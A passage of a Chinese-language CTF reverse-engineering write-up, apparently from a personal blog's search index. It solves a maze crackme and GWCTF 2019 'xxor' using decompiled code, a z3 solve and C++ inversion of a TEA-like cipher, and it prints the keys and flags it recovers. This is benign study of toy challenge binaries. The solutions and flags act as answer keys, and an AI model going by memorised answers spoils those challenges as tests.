0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 回头再看函数\nfor ( i = 0; i \u0026lt; v3; ++i ) { v0 = Buffer[i]; if ( v0 == 0x31 ) { --v5; } else if ( v0 \u0026gt; 49 ) { if ( v0 == 50 ) { ++v6; } else { if ( v0 != 51 ) { LABEL_16: puts(\u0026quot;failed.\u0026quot;); goto LABEL_17; } --v6; } } else { if ( v0 != 48 ) goto LABEL_16; ++v5; } LABEL_17: if ( !byte_404020[10 * v6 + v5] || v6 \u0026lt; 0 || v5 \u0026lt; 0 || v6 \u0026gt; 9 || v5 \u0026gt; 9 ) puts(\u0026quot;failed.\u0026quot;); } 易得\n0 ++v5 right 1 --v5 left 2 ++v6 down 3 --v6 up 手动走迷宫得 key:20220002033330202222202202\n回cmd运行得flag\nkey:20220002033330202222202202 flag{20220002033330202222202202} 0x02 GWCTF 2019 xxor 快乐的解方程题目\n解压打开发现不是exe，无法打开直接拖die\n发现是elf64（linux可执行文件），马上去开虚拟机\nubuntu里先运行一下\ndx3906@ubuntu:~/Desktop$ '/home/dx3906/attachment' Let us play a game? you have six chances to input Come on! input: 1231212 input: 3 input: 12 input: 3 input: 12 input: 3 Wrong! NO NO NO~ 发现题目需要输入六次，拖ida F5\n在左边Functions Window找到了main函数，竟然是真的\n__int64 __fastcall main(int a1, char **a2, char **a3) { int i; // [rsp+8h] [rbp-68h] int j; // [rsp+Ch] [rbp-64h] __int64 v6[6]; // [rsp+10h] [rbp-60h] BYREF __int64 v7[6]; // [rsp+40h] [rbp-30h] BYREF v7[5] = __readfsqword(0x28u); puts(\u0026quot;Let us play a game?\u0026quot;); puts(\u0026quot;you have six chances to input\u0026quot;); puts(\u0026quot;Come on!\u0026quot;); v6[0] = 0LL; v6[1] = 0LL; v6[2] = 0LL; v6[3] = 0LL; v6[4] = 0LL; for ( i = 0; i \u0026lt;= 5; ++i ) { printf(\u0026quot;%s\u0026quot;, \u0026quot;input: \u0026quot;); __isoc99_scanf(\u0026quot;%d\u0026quot;, (char *)v6 + 4 * i); } v7[0] = 0LL; v7[1] = 0LL; v7[2] = 0LL; v7[3] = 0LL; v7[4] = 0LL; for ( j = 0; j \u0026lt;= 2; ++j ) { dword_601078 = v6[j]; dword_60107C = HIDWORD(v6[j]); sub_400686(\u0026amp;dword_601078, \u0026amp;unk_601060); LODWORD(v7[j]) = dword_601078; HIDWORD(v7[j]) = dword_60107C; } if ( (unsigned int)sub_400770(v7) != 1 ) { puts(\u0026quot;NO NO NO~ \u0026quot;); exit(0); } puts(\u0026quot;Congratulation!\\n\u0026quot;); puts(\u0026quot;You seccess half\\n\u0026quot;); puts(\u0026quot;Do not forget to change input to hex and combine~\\n\u0026quot;); puts(\u0026quot;ByeBye\u0026quot;); return 0LL; } 倒着看，先进if里面的判断函数sub_400770(v7)\n__int64 __fastcall sub_400770(_DWORD *a1) { __int64 result; // rax if ( a1[2] - a1[3] == 0x84A236FFLL \u0026amp;\u0026amp; a1[3] + a1[4] == 0xFA6CB703LL \u0026amp;\u0026amp; a1[2] - a1[4] == 0x42D731A8LL \u0026amp;\u0026amp; *a1 == 0xDF48EF7E \u0026amp;\u0026amp; a1[5] == 0x84F30420 \u0026amp;\u0026amp; a1[1] == 0x20CAACF4 ) { puts(\u0026quot;good!\u0026quot;); result = 1LL; } else { puts(\u0026quot;Wrong!\u0026quot;); result = 0LL; } return result; } 果然如题目解方程，z3搞它\nfrom z3 import * a = Int('a') b = Int('b') c = Int('c') d = Int('d') e = Int('e') f = Int('f') s = Solver() s.add(a == 0xDF48EF7E) s.add(b == 0x20CAACF4) s.add(f == 0x84F30420) s.add(c-d == 0x84A236FF) s.add(d+e == 0xFA6CB703) s.add(c-e == 0x42D731A8) print(s.check()) print(s.model()) a-f表示a1的0-5，z3里不会定义数组，干脆用字母，会的佬教一下孩子\n得到结果\nsat [c = 3774025685, d = 1548802262, e = 2652626477, f = 2230518816, b = 550153460, a = 3746099070] 但这还没完（要是光解方程可能也做不了第三题\n解出来的是加密后的input，加密算法如下\nfor ( j = 0; j \u0026lt;= 2; ++j ) { dword_601078 = v6[j]; dword_60107C = HIDWORD(v6[j]); sub_400686(\u0026amp;dword_601078, \u0026amp;unk_601060); LODWORD(v7[j]) = dword_601078; HIDWORD(v7[j]) = dword_60107C; } 基本是把高四字节（HIDWORD）和低四字节（LODWORD）分开一顿操作，进函数sub_400686\n__int64 __fastcall sub_400686(unsigned int *a1, _DWORD *a2) { __int64 result; // rax unsigned int v3; // [rsp+1Ch] [rbp-24h] unsigned int v4; // [rsp+20h] [rbp-20h] int v5; // [rsp+24h] [rbp-1Ch] unsigned int i; // [rsp+28h] [rbp-18h] v3 = *a1; v4 = a1[1]; v5 = 0; for ( i = 0; i \u0026lt;= 0x3F; ++i ) { v5 += 0x458BCD42; v3 += (v4 + v5 + 11) ^ ((v4 \u0026lt;\u0026lt; 6) + *a2) ^ ((v4 \u0026gt;\u0026gt; 9) + a2[1]) ^ 0x20; v4 += (v3 + v5 + 20) ^ ((v3 \u0026lt;\u0026lt; 6) + a2[2]) ^ ((v3 \u0026gt;\u0026gt; 9) + a2[3]) ^ 0x10; } *a1 = v3; result = v4; a1[1] = v4; return result; } 感觉好像我的二面题，tea加密？\n变量只有v3，v4，且求v3时v4已知，求v4时v3已知\n结论：可逆，难点在于各种数据类型容易把自己搞晕\n注意主函数input格式控制为%d，故用int存flag\n__isoc99_scanf(\u0026quot;%d\u0026quot;, (char *)v6 + 4 * i); 完整代码\n#include\u0026lt;cstdio\u0026gt; unsigned int flag[100],a1[]={3746099070,550153460,3774025685,1548802262,2652626477,2230518816}; unsigned long long a2[10]; unsigned int key[5]={2,2,3,4}; int v5; int main(){ for(int i=0;i\u0026lt;3;i++){ a2[i]=*((unsigned long long*)a1+i); } for(int i=0;i\u0026lt;3;i++){ unsigned int xl=*((unsigned int*)\u0026amp;a2[i]);//低位 unsigned int xh=*((unsigned int*)\u0026amp;a2[i]+1);//高位 for(int j=0x3F;j\u0026gt;=0;j--){ v5=(j+1)*0x458BCD42; xh-=(xl+v5+20)^((xl\u0026lt;\u0026lt;6)+key[2])^((xl\u0026gt;\u0026gt;9)+key[3])^0x10; xl-=(xh+v5+11)^((xh\u0026lt;\u0026lt;6)+key[0])^((xh\u0026gt;\u0026gt;9)+key[1])^0x20; } flag[2*i]=xl; flag[2*i+1]=xh; } for(int i=0;i\u0026lt;6;i++){ printf(\u0026quot;%d\\n\u0026quot;,flag[i]); } } 输出6个数字\n6712417 6781810 6643561 7561063 7497057 7610749 回 Ubuntu input\ndx3906@ubuntu:~/Desktop$ '/home/dx3906/attachment' Let us play a game? you have six chances to input Come on! input: 6712417 input: 6781810 input: 6643561 input: 7561063 input: 7497057 input: 7610749 good! Congratulation! You seccess half Do not forget to change input to hex and combine~ ByeBye 成功了，但还没有完全成功\nhex？？？百度先\n偷懒得flag，真香\n当然还是要认真学一学（\nBase64与Hex编码\n最后，手写解码奉上(使用上一段代码的flag数组)\nbool f=0; int t,cnt=0,ans[10]; for(int i=0;i\u0026lt;6;i++){ cnt=0; while(flag[i]){ if(!f){ t=flag[i]%16; flag[i]/=16; f=1; } if(f){ t+=flag[i]%16\u0026lt;\u0026lt;4; flag[i]/=16; ans[++cnt]=t; f=0; } } for(int j=cnt;j\u0026gt;=1;j--){ printf(\u0026quot;%c\u0026quot;,ans[j]); } } ","id":27,"section":"posts","summary":"第九周 0x00 Hacking with Google: Beginner 做了一半卡住了，偷看了一下官方题解，然后复现一下 ida很容易定位到主函数 int __cdecl main(int argc, const char **argv, const char **envp) { int v3; // er12 __m128i v5; // [rsp+0h] [rbp-38h] BYREF __m128i s2[2]; // [rsp+10h] [rbp-28h]","tags":["CTF","reverse"],"title":"强壮逆向人wp","uri":"https://blog.dx39061.top/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/","year":"2022"}],"tags":[{"title":"angr","uri":"https://blog.dx39061.top/tags/angr/"},{"title":"assembly","uri":"https://blog.dx39061.top/tags/assembly/"},{"title":"binary","uri":"https://blog.dx39061.top/tags/binary/"},{"title":"cpp","uri":"https://blog.dx39061.top/tags/cpp/"},{"title":"crack","uri":"https://blog.dx39061.top/tags/crack/"},{"title":"crypto","uri":"https://blog.dx39061.top/tags/crypto/"},{"title":"CTF","uri":"https://blog.dx39061.top/tags/ctf/"},{"title":"life","uri":"https://blog.dx39061.top/tags/life/"},{"title":"linux","uri":"https://blog.dx39061.top/tags/linux/"},{"title":"misc","uri":"https://blog.dx39061.top/tags/misc/"},{"title":"misunderstanding","uri":"https://blog.dx39061.top/tags/misunderstanding/"},{"title":"oop","uri":"https://blog.dx39061.top/tags/oop/"},{"title":"pwn","uri":"https://blog.dx39061.top/tags/pwn/"},{"title":"python","uri":"https://blog.dx39061.top/tags/python/"},{"title":"reverse","uri":"https://blog.dx39061.top/tags/reverse/"}]}